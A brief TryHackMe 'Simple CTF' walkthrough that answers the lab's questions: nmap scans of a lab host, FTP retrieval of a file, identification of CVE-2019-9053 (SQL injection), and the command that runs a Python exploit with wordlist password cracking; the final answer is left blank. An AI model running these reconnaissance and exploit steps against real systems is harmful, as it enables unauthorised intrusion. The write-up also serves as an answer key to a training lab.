# Simple CTF

```
export ip=10.10.208.204
```

# 1. How many services are running under port 1000?

```json
run nmap scan on machine using -sC -sV 
```nmap -sC -sV -oN nmap/initial 10.10.208.204
```

```
2
```

# 2. What is running on the higher port?

```json
we will use -p 0-9999 to specify scan ports from 0 to 9999 in nmap
```

```nmap -p 0-9999 -oN nmap/all_ports 10.10.208.204
```

```
ssh
```
	
```json
I ftp into 10.10.208.204 and found ForMitch.txt and grabbed it to my host using get
```	

# 3. What's the CVE you're using against the application? 

```json
searched for exploits against the web servers host template version (2.2.8) and found CVE-2019-9053
```

```
CVE-2019-9053
```

# 4. To what kind of vulnerability is the application vulnerable?

```json
the exploit was a SQL Injection and since tryhackme states the answer is 4 letters it should be SQLi
```

```
SQLi
```

# 5. What's the password?

```json
we run the python exploit and specify the rhosts and using --crack we will attempt to crack the password using a wordlist in this case best110.txt
```

```python3 exploit.py -u http://10.10.208.204/simple --crack -w /thm/best110.txt 
```

```

```

